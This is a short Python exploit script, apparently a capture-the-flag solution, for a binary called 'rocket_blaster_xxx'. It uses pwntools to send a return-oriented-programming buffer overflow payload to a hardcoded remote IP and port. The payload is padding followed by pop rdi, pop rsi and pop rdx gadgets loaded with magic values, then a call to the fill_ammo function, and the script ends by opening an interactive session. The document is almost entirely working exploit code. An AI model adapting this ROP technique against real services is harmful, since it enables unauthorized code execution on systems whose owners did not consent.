#!/usr/bin/env python3

from pwn import *

exe = ELF("./rocket_blaster_xxx_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
p = remote('94.237.62.117',43328)
#gdb.attach(p,gdbscript='''
#           b*0x00000000004014C6
#           ''')
input()

pop_rdi = 0x000000000040159f
pop_rsi = 0x000000000040159d
pop_rdx = 0x000000000040159b

payload = b'a'*0x28
payload += p64(pop_rdi)
payload += p64(0xDEADBEEF)
payload += p64(pop_rsi)
payload += p64(0xDEADBABE)
payload += p64(pop_rdx)
payload += p64(0xDEAD1337)
payload += p64(pop_rdi+1)
payload += p64(exe.sym.fill_ammo)
p.send(payload)

p.interactive()
